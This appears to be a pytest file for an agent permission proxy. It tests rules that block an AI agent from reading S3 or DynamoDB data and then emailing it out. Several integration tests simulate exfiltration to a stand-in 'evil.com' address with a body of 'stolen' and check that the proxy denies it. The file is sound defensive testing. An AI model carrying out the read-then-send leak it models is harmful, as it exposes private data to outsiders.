"""Tests for cross-system escalation detection.

Unit tests for the escalation module (SessionTracker, check_escalation, rules)
and integration tests through the full proxy flow.
"""

import pytest
from fastapi.testclient import TestClient

from agentgate.action_mapping.config_loader import load_config_from_dict
from agentgate.mock_aws.base import MockServiceRegistry
from agentgate.mock_aws.dynamodb import MockDynamoDB
from agentgate.mock_aws.s3 import MockS3
from agentgate.mock_aws.ses import MockSES
from agentgate.permission_engine.models import IdentityPolicies
from agentgate.proxy.app import create_app
from agentgate.proxy.audit import AuditLogger
from agentgate.proxy.auth import ApiKeyAuthenticator
from agentgate.proxy.dependencies import AppDependencies, FakePolicyFetcher
from agentgate.proxy.escalation import (
    DEFAULT_ESCALATION_RULES,
    EscalationRule,
    SessionTracker,
    check_escalation,
)

ALICE_ARN = "arn:aws:iam::123456789012:user/alice"


def _allow_policy(action, resource="*"):
    return {
        "Version": "2012-10-17",
        "Statement": [{"Effect": "Allow", "Action": action, "Resource": resource}],
    }


@pytest.fixture
def escalation_app(tmp_path):
    """Test app where alice has S3 + DynamoDB + SES permissions.

    Alice can do everything individually, but the escalation rules should
    block read-then-send patterns.
    """
    authenticator = ApiKeyAuthenticator({
        "alice-key": {"user_arn": ALICE_ARN, "agent_id": "agent-alice"},
    })

    config = load_config_from_dict({
        "version": "1",
        "account_id": "123456789012",
        "region": "us-east-1",
        "tools": {
            "read_file": {
                "aws_actions": [{"action": "s3:GetObject", "resource": "arn:aws:s3:::{bucket}/{key}"}],
                "required_args": ["bucket", "key"],
            },
            "query_database": {
                "aws_actions": [
                    {"action": "dynamodb:Query", "resource": "arn:aws:dynamodb:{region}:{account_id}:table/{table}"}
                ],
                "required_args": ["table"],
            },
            "send_email": {
                "aws_actions": [{"action": "ses:SendEmail", "resource": "*"}],
            },
        },
    })

    registry = MockServiceRegistry()
    MockS3().seed("reports", "q4.csv", "revenue,cost\n1000,500")
    MockS3.register(MockS3(), registry)

    mock_s3 = MockS3()
    mock_s3.seed("reports", "q4.csv", "revenue,cost\n1000,500")
    mock_s3.register(registry)

    mock_dynamo = MockDynamoDB()
    mock_dynamo.seed("employees", [
        {"dept": {"S": "engineering"}, "name": {"S": "Alice"}},
    ])
    mock_dynamo.register(registry)

    mock_ses = MockSES()
    mock_ses.register(registry)

    # Alice has IAM permission for everything — S3, DynamoDB, SES
    fetcher = FakePolicyFetcher({
        ALICE_ARN: IdentityPolicies(inline_policies=[
            _allow_policy(["s3:GetObject", "dynamodb:Query", "ses:SendEmail"]),
        ]),
    })

    audit = AuditLogger(db_path=str(tmp_path / "test_audit.db"))

    deps = AppDependencies(
        authenticator=authenticator,
        config=config,
        registry=registry,
        fetcher=fetcher,
        audit=audit,
    )

    app = create_app(deps)
    return TestClient(app), deps


# --- Unit tests for SessionTracker ---


class TestSessionTracker:
    def test_empty_history(self):
        tracker = SessionTracker()
        assert tracker.get_history("session-1") == []

    def test_record_and_get(self):
        tracker = SessionTracker()
        tracker.record("session-1", "s3:GetObject")
        tracker.record("session-1", "dynamodb:Query")
        assert tracker.get_history("session-1") == ["s3:GetObject", "dynamodb:Query"]

    def test_separate_sessions(self):
        tracker = SessionTracker()
        tracker.record("session-1", "s3:GetObject")
        tracker.record("session-2", "ses:SendEmail")
        assert tracker.get_history("session-1") == ["s3:GetObject"]
        assert tracker.get_history("session-2") == ["ses:SendEmail"]

    def test_clear_session(self):
        tracker = SessionTracker()
        tracker.record("session-1", "s3:GetObject")
        tracker.clear("session-1")
        assert tracker.get_history("session-1") == []

    def test_clear_nonexistent_session(self):
        tracker = SessionTracker()
        tracker.clear("no-such-session")  # should not raise

    def test_clear_all(self):
        tracker = SessionTracker()
        tracker.record("session-1", "s3:GetObject")
        tracker.record("session-2", "dynamodb:Query")
        tracker.clear_all()
        assert tracker.get_history("session-1") == []
        assert tracker.get_history("session-2") == []

    def test_get_history_returns_copy(self):
        tracker = SessionTracker()
        tracker.record("session-1", "s3:GetObject")
        history = tracker.get_history("session-1")
        history.append("should-not-persist")
        assert tracker.get_history("session-1") == ["s3:GetObject"]


# --- Unit tests for check_escalation ---


class TestCheckEscalation:
    def test_no_rules_allows_everything(self):
        result = check_escalation(["s3:GetObject"], "ses:SendEmail", rules=[])
        assert result is None

    def test_no_trigger_allows_blocked_action(self):
        """If no trigger action was seen, blocked action is allowed."""
        rules = [DEFAULT_ESCALATION_RULES[0]]
        result = check_escalation([], "ses:SendEmail", rules)
        assert result is None

    def test_trigger_then_blocked_action_is_blocked(self):
        """read data → send email should be blocked."""
        rules = [DEFAULT_ESCALATION_RULES[0]]
        result = check_escalation(["s3:GetObject"], "ses:SendEmail", rules)
        assert result is not None
        assert result.blocked is True
        assert result.rule_name == "data_exfiltration"
        assert "s3:GetObject" in result.reason
        assert "ses:SendEmail" in result.reason

    def test_dynamodb_trigger_blocks_email(self):
        """DynamoDB query → send email should also be blocked."""
        rules = [DEFAULT_ESCALATION_RULES[0]]
        result = check_escalation(["dynamodb:Query"], "ses:SendEmail", rules)
        assert result is not None
        assert result.blocked is True

    def test_trigger_without_blocked_action_is_fine(self):
        """read data → write data should not be blocked."""
        rules = [DEFAULT_ESCALATION_RULES[0]]
        result = check_escalation(["s3:GetObject"], "s3:PutObject", rules)
        assert result is None

    def test_unrelated_action_after_trigger_is_fine(self):
        """read data → read more data is fine."""
        rules = [DEFAULT_ESCALATION_RULES[0]]
        result = check_escalation(["s3:GetObject"], "dynamodb:Query", rules)
        assert result is None

    def test_custom_rule(self):
        rules = [EscalationRule(
            name="test_rule",
            description="Test rule",
            trigger_actions=["lambda:InvokeFunction"],
            blocked_actions=["iam:CreateRole"],
            severity="HIGH",
        )]
        result = check_escalation(["lambda:InvokeFunction"], "iam:CreateRole", rules)
        assert result is not None
        assert result.rule_name == "test_rule"

    def test_multiple_rules_first_match_wins(self):
        rules = [
            EscalationRule("rule_a", "Rule A", ["s3:GetObject"], ["ses:SendEmail"], "HIGH"),
            EscalationRule("rule_b", "Rule B", ["s3:GetObject"], ["ses:SendEmail"], "LOW"),
        ]
        result = check_escalation(["s3:GetObject"], "ses:SendEmail", rules)
        assert result is not None
        assert result.rule_name == "rule_a"


# --- Integration tests through the proxy ---


class TestEscalationIntegration:
    def test_send_email_alone_allowed(self, escalation_app):
        """Sending email without prior data read is fine."""
        client, _deps = escalation_app
        resp = client.post(
            "/execute-tool",
            json={"tool_name": "send_email", "tool_args": {
                "Source": "alice@example.com",
                "Destination": '{"ToAddresses": ["bob@example.com"]}',
                "Message": '{"Subject": {"Data": "Hi"}, "Body": {"Text": {"Data": "Hello"}}}',
            }},
            headers={"X-API-Key": "alice-key"},
        )
        assert resp.status_code == 200

    def test_read_then_send_blocked(self, escalation_app):
        """Data read → email send is blocked by escalation rules."""
        client, _deps = escalation_app

        # Step 1: Alice reads a file (allowed)
        resp = client.post(
            "/execute-tool",
            json={"tool_name": "read_file", "tool_args": {"bucket": "reports", "key": "q4.csv"}},
            headers={"X-API-Key": "alice-key"},
        )
        assert resp.status_code == 200

        # Step 2: Alice tries to send email (blocked by escalation)
        resp = client.post(
            "/execute-tool",
            json={"tool_name": "send_email", "tool_args": {
                "Source": "alice@example.com",
                "Destination": '{"ToAddresses": ["external@evil.com"]}',
                "Message": '{"Subject": {"Data": "Data"}, "Body": {"Text": {"Data": "stolen"}}}',
            }},
            headers={"X-API-Key": "alice-key"},
        )
        assert resp.status_code == 403
        detail = resp.json()["detail"]
        assert detail["decision"] == "DENY"
        assert "escalation" in detail["reason"].lower()
        assert "data_exfiltration" in detail["reason"]

    def test_query_then_send_blocked(self, escalation_app):
        """DynamoDB query → email send is also blocked."""
        client, _deps = escalation_app

        # Step 1: Alice queries DynamoDB (allowed)
        resp = client.post(
            "/execute-tool",
            json={"tool_name": "query_database", "tool_args": {"table": "employees"}},
            headers={"X-API-Key": "alice-key"},
        )
        assert resp.status_code == 200

        # Step 2: Alice tries to send email (blocked)
        resp = client.post(
            "/execute-tool",
            json={"tool_name": "send_email", "tool_args": {
                "Source": "alice@example.com",
                "Destination": '{"ToAddresses": ["external@evil.com"]}',
                "Message": '{"Subject": {"Data": "Hi"}, "Body": {"Text": {"Data": "data"}}}',
            }},
            headers={"X-API-Key": "alice-key"},
        )
        assert resp.status_code == 403

    def test_escalation_logged_to_audit(self, escalation_app):
        """Escalation blocks are recorded in the audit log."""
        client, deps = escalation_app

        # Trigger: read then send
        client.post(
            "/execute-tool",
            json={"tool_name": "read_file", "tool_args": {"bucket": "reports", "key": "q4.csv"}},
            headers={"X-API-Key": "alice-key"},
        )
        client.post(
            "/execute-tool",
            json={"tool_name": "send_email", "tool_args": {
                "Source": "a@b.com",
                "Destination": '{"ToAddresses": ["c@d.com"]}',
                "Message": '{"Subject": {"Data": "X"}, "Body": {"Text": {"Data": "Y"}}}',
            }},
            headers={"X-API-Key": "alice-key"},
        )

        entries = deps.audit.get_recent(limit=10)
        # Find the escalation denial entry
        escalation_entries = [e for e in entries if "escalation" in e["reason"].lower()]
        assert len(escalation_entries) >= 1
        assert escalation_entries[0]["decision"] == "DENY"
        assert escalation_entries[0]["aws_action"] == "ses:SendEmail"

    def test_no_escalation_without_rules(self, tmp_path):
        """With empty escalation rules, read-then-send is allowed."""
        authenticator = ApiKeyAuthenticator({
            "alice-key": {"user_arn": ALICE_ARN, "agent_id": "agent-alice"},
        })
        config = load_config_from_dict({
            "version": "1",
            "account_id": "123456789012",
            "region": "us-east-1",
            "tools": {
                "read_file": {
                    "aws_actions": [{"action": "s3:GetObject", "resource": "arn:aws:s3:::{bucket}/{key}"}],
                    "required_args": ["bucket", "key"],
                },
                "send_email": {
                    "aws_actions": [{"action": "ses:SendEmail", "resource": "*"}],
                },
            },
        })
        registry = MockServiceRegistry()
        mock_s3 = MockS3()
        mock_s3.seed("reports", "q4.csv", "data")
        mock_s3.register(registry)
        MockSES().register(registry)

        fetcher = FakePolicyFetcher({
            ALICE_ARN: IdentityPolicies(inline_policies=[
                _allow_policy(["s3:GetObject", "ses:SendEmail"]),
            ]),
        })
        audit = AuditLogger(db_path=str(tmp_path / "audit.db"))

        deps = AppDependencies(
            authenticator=authenticator,
            config=config,
            registry=registry,
            fetcher=fetcher,
            audit=audit,
            escalation_rules=[],  # No rules
        )
        app = create_app(deps)
        client = TestClient(app)

        # Read then send — should work without escalation rules
        client.post(
            "/execute-tool",
            json={"tool_name": "read_file", "tool_args": {"bucket": "reports", "key": "q4.csv"}},
            headers={"X-API-Key": "alice-key"},
        )
        resp = client.post(
            "/execute-tool",
            json={"tool_name": "send_email", "tool_args": {
                "Source": "a@b.com",
                "Destination": '{"ToAddresses": ["c@d.com"]}',
                "Message": '{"Subject": {"Data": "X"}, "Body": {"Text": {"Data": "Y"}}}',
            }},
            headers={"X-API-Key": "alice-key"},
        )
        assert resp.status_code == 200
